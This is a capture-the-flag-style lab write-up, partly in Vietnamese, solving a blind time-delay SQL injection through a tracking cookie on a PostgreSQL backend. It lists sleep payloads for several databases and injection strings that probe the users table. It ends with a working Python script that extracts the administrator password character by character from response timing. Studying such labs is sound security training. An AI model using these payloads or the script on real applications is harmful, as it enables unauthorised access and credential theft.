# Lab: Blind SQL injection with time delays and information retrieval

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

# Overview:

Theo tiêu đề của lab, chúng ta sẽ thực hiện tấn công SQL mà kết quả trở về có độ trễ. Từ đó ta có thêm thời gian thực thi câu lệnh SQL để thực hiện các cuộc tấn công khác.

Goal của chúng ta là cần inject query đối với time delays thích hợp.

Cheat sheet, time-delay mà lab đưa ví dụ khá là nhiều cho các version database. Vì ko biết sử dụng cái nào mình phải mò từng cái

```
Oracle: dbms_pipe.receive_message(('a'),10)
Microsoft: WAITFOR DELAY '0:0:10'
PostgreSQL: SELECT pg_sleep(10)
MySQL: SELECT sleep(10) 
```

# Solution:

```
SELECT trackingId FROM someTable WHERE trackingId = 'vvv' || (<CODE HERE>) || ''
```

**vvv là giá trị của cookie**

Kí tự đầu tiên được inject vào là `'` sau `vvv`, sau đó mình nối với output của code. Tiếp theo là nối với `'`. Đối với Oracle và PostgreSQL, `||` được sử dụng để ghép nối, với Microsoft `+` và  MySQL là `khoảng trắng`.

Đồi với PostgreSQL inject `'||(SELECT pg_sleep(10))||'`, query cần thời gian giải để hoàn thành: 10.241s. Thường thì đối với mình, query mất khoảng 240millis.Vậy thêm 10 đến từ việc inject

![image](https://user-images.githubusercontent.com/115911041/234800969-b0ba8d28-7555-4c02-94a4-c91e27544904.png)


## Xác định tên table và column cũng như là username:

Bây giờ ta đã biết database đang chạy version nào, bước tiếp theo:

- Xác định table `users` có tồn tại hay không

- Xác định columns `username` và `password`

- Tìm Entry của username `administrtor`

Mình đã giảm xuống delay đến 3 secs để cho nó tiện hơn.

`'||(SELECT pg_sleep(3) FROM users LIMIT 1)||'`

![image](https://user-images.githubusercontent.com/115911041/234802100-7a17b2a6-0262-4c8f-bfb1-40b98f5e3d28.png)

`'||(SELECT pg_sleep(3)||username||password FROM users LIMIT 1)||'`

![image](https://user-images.githubusercontent.com/115911041/234802664-9461a3b5-b35c-49a8-b45d-fcddb8035404.png)

`'||(SELECT pg_sleep(3)||username||password FROM users WHERE username='administrator')||'`

![image](https://user-images.githubusercontent.com/115911041/234802886-5d458454-fe78-47af-9dce-7e6013a61514.png)

Cả 3 query đều hơn 3 secs, trong khi sử dụng các tên table khác nhau hoặc cột hoặc sử dụng tên username, thì phản hồi có ngay.

Vậy table có tồn tại với column `username` và `password`, bao gồm entry cho `administrator` như là username.

## Xác định độ dài của password

```
'SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- 
```

Nếu 1 trong 2 điều kiện không đúng thì kết quả trả về sẽ không có độ trễ, do đó ta đã biết được rằng username là administrator và độ dài của chuỗi password phải lớn hơn 1.

Ta tiếp tục thử đển khi giá trị độ dài của chuỗi password > 20 thì khi đó kết quả trả về sẽ không có độ trễ. Do đó ta có thể suy ra được độ dài của chuỗi bao gồm 20 kí tự.





# Script python
```
import requests
import string
from requests.exceptions import Timeout

characters = list(string.ascii_lowercase)
characters += list(string.digits)
url = "" #Target URL
length = 20
result = ''

print("[+] Extract Info")

for i in range(1, length+1):
    for char in characters:
        payload = "a'%%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,%i,1)='%s')+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--" %(i, char)
        print("Tring Number %i with: " %(i), char)
        cookie = {"TrackingId":payload}
        try:
            requests.get(url, cookies=cookie , timeout=5)
        except Timeout:
            result += char
            break

    print("[+] Result is : ", result)
```


